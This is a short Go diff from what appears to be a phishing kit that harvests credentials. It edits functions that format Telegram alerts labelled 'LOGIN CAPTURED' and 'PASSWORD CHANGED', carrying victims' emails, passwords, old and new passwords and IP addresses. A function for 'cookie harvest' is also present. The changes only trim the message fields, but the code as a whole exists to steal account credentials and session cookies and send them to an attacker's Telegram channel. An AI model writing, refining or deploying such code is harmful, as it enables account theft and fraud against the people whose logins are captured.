@@ -34,7 +34,7 @@ func SendTelegramMessage(cfg TelegramConfig, message string) {
 }
 
 func FormatLoginAlert(email, password, ip, userAgent string) string {
-	return fmt.Sprintf("🔑 <b>LOGIN CAPTURED</b>\n📧 Email: <code>%s</code>\n🔒 Password: <code>%s</code>\n🌐 IP: <code>%s</code>\n🖥️ User-Agent: <code>%s</code>\n⏰ Time: %s\n", email, password, ip, userAgent, time.Now().Format("15:04:05"))
+	return fmt.Sprintf("🔑 <b>LOGIN CAPTURED</b>\n📧 Email: <code>%s</code>\n🔒 Password: <code>%s</code>\n🌐 IP: <code>%s</code>\n⏰ Time: %s\n", email, password, ip, time.Now().Format("15:04:05"))
 }
 
 func FormatCookieHarvest(email string, cookies []string) string {
@@ -46,5 +46,5 @@ func FormatCookieHarvest(email string, cookies []string) string {
 }
 
 func FormatPasswordChange(oldPass, newPass, email string) string {
-	return fmt.Sprintf("🔄 <b>PASSWORD CHANGED</b>\n📧 User: <code>%s</code>\n🔓 Old Pass: <code>%s</code>\n🔑 New Pass: <code>%s</code>\n⏰ Time: %s\n", email, oldPass, newPass, time.Now().Format("15:04:05"))
+	return fmt.Sprintf("🔄 <b>PASSWORD CHANGED</b>\n📧 User: <code>%s</code>\n🔓 Old Pass: <code>%s</code>\n🔑 New Pass: <code>%s</code>\n", email, oldPass, newPass)
 }
